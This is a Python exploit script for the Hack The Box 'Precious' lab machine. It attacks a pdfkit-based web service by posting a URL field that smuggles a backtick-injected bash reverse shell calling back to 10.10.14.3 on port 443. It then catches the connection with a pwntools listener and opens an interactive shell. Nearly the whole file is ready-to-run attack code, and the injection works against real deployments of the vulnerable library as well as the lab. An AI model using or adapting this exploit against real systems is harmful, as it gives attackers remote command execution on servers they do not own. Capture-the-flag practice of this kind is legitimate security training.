#!/usr/bin/python3
# pdfkit exploit (reverse shell) for Hack The Box Precious
# Usage <sudo python3 pdfkit_xploit.py> 
# You need to change the ip and port in the post_data variable
import requests
import signal
import pdb # For Debugging of code
import sys
import time
import subprocess
import atexit
import multiprocessing
from pwn import log, listen

def def_handler(sig, frame):
    print("\n\nExiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://precious.htb"
http_server = subprocess.Popen(["python3", "-m", "http.server", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
lport = 443
def cleanup():
    if http_server.poll() is None:
        http_server.kill()
atexit.register(cleanup)

def makeRequest():
    #time.sleep(10)
    post_data = {
        'url': 'http://10.10.14.3/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.3/443 0>&1"`'
        # bash oneliner comes from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
    }

    r = requests.post(main_url, data=post_data)

def main():

    p1 = log.progress("Services")
    p1.status("Initiating HTTP service over port 80")

    time.sleep(2)

    if http_server.poll() is None:
        p1.success("HTTP service successfully started!")
    else:
        p1.error("There is an error in deploying the HTTP service.")
        cleanup()
        sys.exit(1)

    try:
        proc = multiprocessing.Process(target=makeRequest)
        proc.start()
        #threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))
        cleanup()
        sys.exit(1)

    with listen(lport, timeout=20) as shell:
        if shell.wait_for_connection():
            print()
            shell.interactive()
    #shell = listen(lport, timeout=20).wait_for_connection()

    #if shell.sock:
        #shell.interactive()



if __name__ == '__main__':
    main()
